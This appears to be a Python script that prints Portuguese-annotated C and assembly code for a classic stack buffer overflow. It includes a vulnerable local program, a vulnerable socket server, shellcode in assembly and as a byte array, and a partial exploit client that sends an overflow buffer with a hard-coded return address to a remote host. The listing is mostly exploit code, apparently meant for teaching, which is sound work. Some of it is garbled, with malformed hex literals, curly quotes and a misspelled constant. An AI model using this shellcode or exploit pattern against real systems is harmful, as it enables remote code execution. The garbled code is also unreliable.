#Exploit codes assembly e C

#Exploit codes

print('''

void ProcessaParm(char *arg);
void main(int argc, char *argv[]){
if (argc > 1){
printf(”Param: %s\n”,argv[1]);
ProcessaParm(argv[1]);
}
}
void ProcessaParm(char *arg){
char buffer[10];
strcpy(buffer,arg); /* PROBLEMA: se a string contida em arg
tiver mais que 10 carateres havera
um “buffer overflow” */
printf(buffer);
}

#Codigo 1: Programa vulnerável a buffer overflow

listen(Sock, 1);
while(1){
Tam = sizeof(struct sockaddr_in);
if((Novo=accept(Sock, (struct sockaddr *)&Cliente,&Tam))==1) exit(1);
memset(Mens,0,strlen(Mens));
if(read(Novo,Mens,sizeof(Mens)) < 0) exit(2);
TrataMensagem(Mens);
close(Novo);
}
void TrataMensagem(char *Mens){
char Buffer[256];
strcpy(Buffer,Mens); /* VULNERABILIDADE: caso Mens seja maior que 256, haverá o estouro*/
.
.
.
}

#Código 2: Trecho do programa servidor alvo do ataque

void main() {
__asm__("
jmp INICIO
FUNCAO:
pop %esi
xor %eax,%eax
movb %eax,7(%esi)
mov %esi,%ebx
movb $0x8,%al
mov $0xfffff1ff,%ecx
int $0x80
movb $1,%al
xorl %ebx,%ebx
int $0x80
INICIO:
CALL FUNCAO
.string \"/bin/sx \"
");
}

#Código 3: Código malicioso em assembly




unsigned char cod[]={
0xeb,0×1f,
0×90,0×90,0×90,0×90,
0×5e,
0×31,0xc0,
0×88,0×46,0×07,
0×89,0xf3,
0xb0,0×08,
0xb9,0xff,0xf1,0xff,0xff,
0xcd,0×80,
0xb0,0×01,
0×31,0xdb,
0xcd,0×80,
0×90,0×90,0×90,0×90,
0xe8,0xe0,0xff,0xff,0xff,0};

#Código 4: Versão em byte code do código malicioso




#include
#define TAM_BUFFER 256
unsigned char cod[]={
0xeb,0×1f,
0×90,0×90,0×90,0×90,
0×5e,
0×31,0xc0,
0×88,0×46,0×07,
0×89,0xf3,
0xb0,0×08,
0xb9,0xff,0xf1,0xff,0xff,
0xcd,0×80,
0xb0,0×01,
0×31,0xdb,
0xcd,0×80,
0×90,0×90,0×90,0×90,
0xe8,0xe0,0xff,0xff,0xff,0};
char comando[]=”/bin/sx “;
main(int argc, char **argv)
{
unsigned char Buffer[TAM_BUFFER+9];
long end;
end=0xbffff71c;
memset(Buffer,’A',TAM_BUFFER);
strcpy(Buffer,cod);
strcat(Buffer,comando);
Buffer[strlen(Buffer)]=’A';
*(long *)&Buffer[TAM_BUFFER] = 0xcacacaca;
*(long *)&Buffer[TAM_BUFFER+4] = end;
Buffer[TAM_BUFFER+8] = 0;
.
.
.
if(connect(Sock, (struct sockaddr *)&sin, sizeof(sin)) < 0 ) exit(1);
write(Sock, Buffer, TAM_BYFFER+20);
}

#Código 5: Primeira parte do exploit



''')
